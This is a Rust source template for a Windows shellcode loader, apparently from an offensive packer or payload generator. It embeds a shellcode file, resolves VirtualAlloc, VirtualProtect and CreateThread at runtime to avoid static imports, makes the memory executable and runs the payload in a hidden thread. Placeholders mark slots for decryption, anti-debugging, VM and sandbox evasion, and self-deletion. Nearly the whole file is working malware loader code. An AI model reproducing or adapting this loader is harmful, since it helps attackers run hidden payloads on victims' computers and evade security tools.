#![windows_subsystem = "windows"]
#![allow(non_snake_case)]
#![allow(unused_imports)]

use std::process;
use std::ffi::c_void;

use windows_sys::Win32::Foundation::HANDLE;
use windows_sys::Win32::Foundation::GetLastError;
use windows_sys::Win32::Security::SECURITY_ATTRIBUTES;
use windows_sys::Win32::System::LibraryLoader::{GetModuleHandleA,GetProcAddress};
use windows_sys::Win32::System::Threading::{WaitForSingleObject,LPTHREAD_START_ROUTINE,THREAD_CREATION_FLAGS};
use windows_sys::Win32::System::Memory::{MEM_COMMIT,MEM_RESERVE, PAGE_READWRITE, PAGE_EXECUTE_READ, PAGE_PROTECTION_FLAGS};
use std::ptr;

{{ENCRYPTION_IMPORTS}}
{{ANTIDEBUG_IMPORTS}}
{{VM_IMPORTS}}
{{SANDBOX_IMPORTS}}
{{DEOBFUSCATION_IMPORTS}}

{{ANTIDEBUG_FUNCTION}}
{{VM_FUNCTION}}
{{SANDBOX_FUNCTION}}
{{DECRYPTION_FUNCTION}}
{{DEOBFUSCATION_FUNCTION}}

type DWORD = u32;

fn main() {

    {{SELF-DESTROY}}
    {{DEBUG_PRIVILEGE}}
    {{VM}}
    {{SANDBOX}}
    {{ANTIDEBUG}}

    let sKernel32 =b"kernel32.dll\0";
    let sVirtualAlloc = b"VirtualAlloc\0";
    let sVirtualProtect = b"VirtualProtect\0";
    let sCreateThread = b"CreateThread\0";

    unsafe {
        let buf = include_bytes!({{PATH_TO_SHELLCODE}});
        let mut vec: Vec<u8> = Vec::new();
        for i in buf.iter() {
            vec.push(*i);
        }

        {{DEOBFUSCATION}}
        {{DECRYPTION}}

        type VirtualAllocFn = unsafe extern "system" fn(*const c_void, usize, u32, u32) -> *mut c_void;
        let _pVirtualAlloc = GetProcAddress(
            GetModuleHandleA(sKernel32.as_ptr()),
            sVirtualAlloc.as_ptr()
        ).unwrap();
        let pVirtualAlloc: VirtualAllocFn = std::mem::transmute(_pVirtualAlloc);
        let base_addr: *mut c_void= pVirtualAlloc(
            ptr::null_mut(),
            vec.len().try_into().unwrap(),
            MEM_COMMIT | MEM_RESERVE,
            PAGE_READWRITE
        );

        if base_addr.is_null() {
            //println!("[-] Couldn't allocate memory to current proc.")
            std::process::exit(0);
        }

        std::ptr::copy(vec.as_ptr() as  _, base_addr, vec.len());

        let mut old_protect: DWORD = PAGE_READWRITE;

        type VirtualProtectFn = unsafe extern "system" fn(*const c_void, usize, PAGE_PROTECTION_FLAGS, *mut PAGE_PROTECTION_FLAGS) -> *mut c_void;
        let _pVirtualProtect = GetProcAddress(GetModuleHandleA(sKernel32.as_ptr()), sVirtualProtect.as_ptr()).unwrap();
        let pVirtualProtect: VirtualProtectFn = std::mem::transmute(_pVirtualProtect);

        //let pVirtualProtect:unsafe extern "system" fn(*const c_void, usize, PAGE_PROTECTION_FLAGS, *mut PAGE_PROTECTION_FLAGS) -> _ = {VirtualProtect};
        let virtual_protect = pVirtualProtect (
            base_addr,
            vec.len() as usize,
            PAGE_EXECUTE_READ,
            &mut old_protect
        );

        if virtual_protect.is_null() {
            std::process::exit(0);
            // let error = GetLastError();
            // println!("[-] Error: {}", error.to_string());
        }

        let mut tid = 0;
        let ep: extern "system" fn(*mut c_void) -> u32 = { std::mem::transmute(base_addr) };

        type CreateThreadFn = unsafe extern "system" fn(*const SECURITY_ATTRIBUTES, usize, LPTHREAD_START_ROUTINE, *const ::core::ffi::c_void, THREAD_CREATION_FLAGS, *mut u32) -> HANDLE;
        let _pCreateThread = GetProcAddress(GetModuleHandleA(sKernel32.as_ptr()), sCreateThread.as_ptr()).unwrap();
        let pCreateThread: CreateThreadFn = std::mem::transmute(_pCreateThread);

        let h_thread = pCreateThread(
            ptr::null_mut(),
            0,
            Some(ep),
            ptr::null_mut(),
            0,
            &mut tid
        );

        if h_thread == 0 {
            std::process::exit(0);
            // let error = GetLastError();
            // println!("{}", error.to_string())
        }

        let status = WaitForSingleObject(h_thread, u32::MAX);
        if status != 0 {
            std::process::exit(0);
            // let error = GetLastError();
            // println!("{}", error.to_string())
        }
    }
}

{{DLL_MAIN}}